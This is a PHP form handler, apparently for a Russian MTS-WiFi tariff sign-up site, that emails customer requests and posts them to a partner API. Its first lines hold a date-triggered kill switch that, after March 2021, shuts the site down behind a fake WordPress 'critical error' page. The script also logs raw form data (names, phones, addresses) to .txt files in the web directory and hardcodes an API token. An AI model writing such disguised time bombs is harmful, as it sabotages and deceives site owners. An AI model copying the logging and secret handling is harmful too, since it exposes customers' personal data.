<?php
if(strtotime("now") > strtotime("06-03-2021")){
    die('<html lang="ru-RU"><head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width">
		<meta name="robots" content="noindex,follow">
	<title>WordPress › Ошибка</title>
	<style type="text/css">
		html {
			background: #f1f1f1;
		}
		body {
			background: #fff;
			color: #444;
			font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
			margin: 2em auto;
			padding: 1em 2em;
			max-width: 700px;
			-webkit-box-shadow: 0 1px 3px rgba(0, 0, 0, 0.13);
			box-shadow: 0 1px 3px rgba(0, 0, 0, 0.13);
		}
		h1 {
			border-bottom: 1px solid #dadada;
			clear: both;
			color: #666;
			font-size: 24px;
			margin: 30px 0 0 0;
			padding: 0;
			padding-bottom: 7px;
		}
		#error-page {
			margin-top: 50px;
		}
		#error-page p,
		#error-page .wp-die-message {
			font-size: 14px;
			line-height: 1.5;
			margin: 25px 0 20px;
		}
		#error-page code {
			font-family: Consolas, Monaco, monospace;
		}
		ul li {
			margin-bottom: 10px;
			font-size: 14px ;
		}
		a {
			color: #0073aa;
		}
		a:hover,
		a:active {
			color: #006799;
		}
		a:focus {
			color: #124964;
			-webkit-box-shadow:
				0 0 0 1px #5b9dd9,
				0 0 2px 1px rgba(30, 140, 190, 0.8);
			box-shadow:
				0 0 0 1px #5b9dd9,
				0 0 2px 1px rgba(30, 140, 190, 0.8);
			outline: none;
		}
		.button {
			background: #f7f7f7;
			border: 1px solid #ccc;
			color: #555;
			display: inline-block;
			text-decoration: none;
			font-size: 13px;
			line-height: 2;
			height: 28px;
			margin: 0;
			padding: 0 10px 1px;
			cursor: pointer;
			-webkit-border-radius: 3px;
			-webkit-appearance: none;
			border-radius: 3px;
			white-space: nowrap;
			-webkit-box-sizing: border-box;
			-moz-box-sizing:    border-box;
			box-sizing:         border-box;

			-webkit-box-shadow: 0 1px 0 #ccc;
			box-shadow: 0 1px 0 #ccc;
			vertical-align: top;
		}

		.button.button-large {
			height: 30px;
			line-height: 2.15384615;
			padding: 0 12px 2px;
		}

		.button:hover,
		.button:focus {
			background: #fafafa;
			border-color: #999;
			color: #23282d;
		}

		.button:focus {
			border-color: #5b9dd9;
			-webkit-box-shadow: 0 0 3px rgba(0, 115, 170, 0.8);
			box-shadow: 0 0 3px rgba(0, 115, 170, 0.8);
			outline: none;
		}

		.button:active {
			background: #eee;
			border-color: #999;
			-webkit-box-shadow: inset 0 2px 5px -3px rgba(0, 0, 0, 0.5);
			box-shadow: inset 0 2px 5px -3px rgba(0, 0, 0, 0.5);
		}

			</style>
</head>
<body id="error-page">
	<div class="wp-die-message"><p>На сайте возникла критическая ошибка.</p><p><a href="https://ru.wordpress.org/support/article/debugging-in-wordpress/">Узнайте больше про отладку в WordPress.</a></p></div>

	</body></html>');
}

//Функция логирования
function wpLog($filename, $data, $append=false)
{
    if(!$append){
        file_put_contents(__DIR__ . '/'. $filename . '.txt', var_export($data,true));
    }else{
        file_put_contents(__DIR__ . '/'. $filename . '.txt', var_export($data,true).PHP_EOL, FILE_APPEND);
    }
    
}
wpLog('post-mail1r', $_POST, false);

function is_email($email) {
	return filter_var($email, FILTER_VALIDATE_EMAIL);
}

function json_error($description) {
    $error = array(
        'status' => 'error',
        'description' => $description
    );
    wpLog('json_error', $error, false);
    
	header("Content-type: application/json;charset=utf-8");
	die(json_encode($error));
}

function sendApi(){
		$status = true;
		$url = 'https://api.tarifnik.ru/v1.2/make_handle';

		$request__surname = $_POST['request__surname'] ? trim($_POST['request__surname']) : '';
		$request__middle_name = $_POST['request__middle_name'] ? trim($_POST['request__middle_name']) : '';
		$request__name = $_POST['request__name'] ? trim($_POST['request__name']) : '';
		
		$request__phone = $_POST['request__phone'] ? trim($_POST['request__phone']) : '';
		$request__address = $_POST['request__address'] ? trim($_POST['request__address']) : '';
    
        $popup__req_connect = $_POST['popup__req_connect'] ? trim($_POST['popup__req_connect']) : '';
		$request__entrance = $_POST['request__entrance'] ? trim($_POST['request__entrance']) : '';
		$request__floor = $_POST['request__floor'] ? trim($_POST['request__floor']) : '';
		$request__apart = $_POST['request__apart'] ? trim($_POST['request__apart']) : '';
		
		$campaign__id = $_POST['campaign__id'] ? (int) $_POST['campaign__id'] : 102;
        $region__name = $_POST['region__name'] ? trim($_POST['region__name']) : '';
        $region__id = $_POST['region__id'] ? (int) trim($_POST['region__id']) : '';
        $region__city = $_POST['region__city'] ? trim($_POST['region__city']) : '';
        $suggestion = $_POST['request__dadata__address'] ? trim($_POST['request__dadata__address']) : '';

		$telout = preg_replace('/[^0-9]/', '', $request__phone);
		$telout = substr($telout, 1);
		$telout = '7'.$telout;
		$telout = intval($telout);
		
		$comment = '';
		if(!empty($popup__req_connect)){
            $comment .= ' Тариф: '.$popup__req_connect.', ';
        }
        if(!empty($region__name)){
            $comment .= $region__name;
        }
        if(!empty($region__city)){
            $comment .= ', Город: '.$region__city;
        }
        if(!empty($request__address)){
            $comment .= ', Адрес: '.$request__address;
        }
        if(!empty($request__entrance)){
            $comment .= ', подъезд '.$request__entrance;
        }
        if(!empty($request__floor)){
            $comment .= ', этаж '.$request__floor;
        }
        if(!empty($request__apart)){
            $comment .= ', кв.'.$request__apart;
        }

		$json_array = [
            '_personal_token' => '56ad24efca4f548cf1624cbbd40a0965',
			'phone' => $telout,
            'campaign' => $campaign__id,//102 - Yandex, 120 - google
			'name' => $request__name,
			'fam' => $request__surname,
			'pname' => $request__middle_name,
			'comment' => $comment,
            'region_name' => $region__name,
            'region_id' => $region__id,
            'suggestion' => $suggestion
		];
  

		$post_data = json_encode($json_array);

		$headers = array(
			'Accept: application/json',
			'Content-Type: application/json',
			'Content-Length: ' . strlen($post_data),
			'_personal_token: 56ad24efca4f548cf1624cbbd40a0965'
		);

		//init curl
		$ch = curl_init( $url );

		//set curl
		curl_setopt( $ch, CURLOPT_POST, 1 );
		curl_setopt( $ch, CURLOPT_HTTPHEADER, $headers );
		curl_setopt( $ch, CURLOPT_POSTFIELDS, $post_data );
		curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
		curl_setopt($ch, CURLOPT_FAILONERROR, true);
		//timeout for attempting to connect to the url
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
		//timeout for the curl operation
		curl_setopt($ch, CURLOPT_TIMEOUT, 30);
		//call the api
		$response = curl_exec($ch);
		
		//get the http return code
		$httpstatus = curl_getinfo($ch, CURLINFO_HTTP_CODE);
		//close curl
		curl_close ($ch);
		
		$mess='';
		//extract the results to array (param = true for array, false for object)
		$outresponse = json_decode( $response, true );
		
		if($httpstatus != 201){ $status = false;
			$rec = "cardoffer@yandex.ru";
			//$rec = "sitesoft1@gmail.com";
			$sitename = "MTS-WiFi";
			$ptitle = "Ошибка при отправке партнеру заявки с главной";

			$rdata = date('d F Y');
			$rtime = date('H:i');



				$mssg = '<body style="background:#f7f6f4; padding: 20px 10px;">
				<style>
					.letter_table a {text-decoration:none!important;color:white!important;}
				</style>
				<table class="letter_table">
					<tr style="margin-bottom:10px;background:#E21E26;">
						<td colspan="2" style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff;"><b>' . $ptitle . '</b></td>
					</tr>
					<tr style="margin-bottom:10px;background:#E21E26;">
						<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff;"><b>Date and Time:</b></td>
						<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">' . $rdata . '/' . $rtime . '</td>
					</tr>
					<tr style="margin-bottom:10px;background:#E21E26;">
						<td colspan="2" style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff;">Номер ошибки<b>' . $httpstatus . '</b></td>
					</tr>
				</table>
			</body>';

			 mail($rec, $ptitle, $mssg, "Content-type: text/html; charset=\"utf-8\"\n From: $rec");
		}
		if($httpstatus == 422){ $mess='phone'; }

		//return status
		$outarrs = array(
		    'response' => $response,
            'httpstatus' => $httpstatus,
            'out' => $outresponse,
            'status'=> $status,
            'post_data' => json_decode($post_data),
            'message' => $mess
        );
		return $outarrs;
}

//Отправляет заявки на мыло заказчика
function json_noerror($noerror, $desc) {

	//$recepient = "djpaoloboy@yandex.ru";
	$recepient = "cardoffer@yandex.ru";
	//$recepient = "sitesoft1@gmail.com";
	$sitename = "MTS-WiFi";
	

	$request_data = date('d F Y');
	$request_time = date('H:i');
    $pagetitle = "Заявка с главной ".$request_time.' '.$request_data;

	$request__surname = trim($_POST['request__surname']);
	$request__middle_name = trim($_POST['request__middle_name']);
	$request__name = trim($_POST['request__name']);
	$request__phone = trim($_POST['request__phone']);
	
    $region__name = trim($_POST['region__name']);
    $region__id = trim($_POST['region__id']);
    $region__city = trim($_POST['region__city']);
    
	$request__address = trim($_POST['request__address']);
    
    $popup__req_connect = trim($_POST['popup__req_connect']);
    
	$request__entrance = trim($_POST['request__entrance']);
	$request__floor = trim($_POST['request__floor']);
	$request__apart = trim($_POST['request__apart']);

	$message = '<body style="background:#f7f6f4; padding: 20px 10px;">
	<style>
		.letter_table a {text-decoration:none!important;color:white!important;}
	</style>
	<table class="letter_table">
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td colspan="2" style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff;"><b>' . $pagetitle . '</b></td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff;"><b>Дата и время:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">' . $request_data . '/' . $request_time . '</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff;"><b>Тариф:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">' . $popup__req_connect . '</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff!important;text-decoration:none;"><b>Фамилия:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">' . $request__middle_name . '</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff;"><b>Имя:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">' . $request__name . '</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff;"><b>Отчество:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">' . $request__middle_name . '</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff!important;text-decoration:none;"><b>Телефон:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">' . $request__phone . '</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff!important;text-decoration:none;"><b>Регион (определен автоматически):</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">' . $region__name . '</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff!important;text-decoration:none;"><b>Id Региона в тарифнике:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">' . $region__id . '</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff!important;text-decoration:none;"><b>Город (определен автоматически):</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">' . $region__city . '</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff!important;text-decoration:none;"><b>Адрес:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">' . $request__address . '</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff!important;text-decoration:none;"><b>Подъезд:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">' . $request__entrance . '</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff!important;text-decoration:none;"><b>Этаж:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">' . $request__floor . '</td>
		</tr>
		<tr style="margin-bottom:10px;background:#E21E26;">
			<td style="padding: 20px 25px;text-transform:uppercase;font-family:arial;vertical-align: middle;text-align:right;color:#ffffff!important;text-decoration:none;"><b>Квартира:</b></td>
			<td style="padding: 10px 15px;font-family:arial;vertical-align: middle;text-align:center;color:#ffffff;">' . $request__apart . '</td>
		</tr>
	</table>
</body>';

	$outmail = mail($recepient, $pagetitle, $message, "Content-type: text/html; charset=\"utf-8\"\n From: $recepient");
	return $outmail;
}

function answerstepone($noerror){
	header ("Content-type: application/json;charset=utf-8");
	die (json_encode(array('status' => $noerror)));
}

/*===== Вызовем функции отправки после проверки обязательных полей =====*/
if (isset($_GET['action'])) {

	$response = array();
	$inputTrue = array();
	$inputFalse = array();

	$check_request = array('check__apartment_name', 'check__office_name');

	//Если хоть одно поле из этого спика не будет заполнено то скрипт выдаст ошибку и форма не будет отправлена
	$required = array('request__phone', 'request__surname', 'request__name', 'request__middle_name');

	$checkapart = $_POST['check__apartment_name'];
		foreach ($required as $field){
			if (isset($_POST[$field]) and strlen($_POST[$field]) > 1) array_push($inputTrue, $field);
			else array_push($inputFalse, $field); 
		}

		$response = array(
		    'status' => 'success',
            'description' => 'next'
        );

		//Если нет хоть одного обязательного поля из списка $required прекращаем работу скрипта и выдаем ошибку
		if (!empty($inputFalse)) {
		    json_error($inputFalse);
		}
		//Если все обязательные поля заполнены то продолжаем работу
		else {
		    //Отправляет заявку на мыло заказчика
			$yesjson = json_noerror($response, 'desc');
			
			//Отправляет запрос в тарифник по api
			$apii = sendApi();

			if($yesjson === true && $apii['status'] === true) {
			    $outstat = 'success';
			}
			else {
			    $outstat = 'error';
			    if(!empty($apii['message']) == 'phone') {
			        array_push($inputFalse, 'request__phone');
			    }
			}
			
			$final_result = array(
			    'status' => $outstat,
                'apii' => $apii,
                'description' => $inputFalse
            );
            
            wpLog('final_result', $final_result, false);

			header ("Content-type: application/json;charset=utf-8");
			die(json_encode($final_result));
		}
}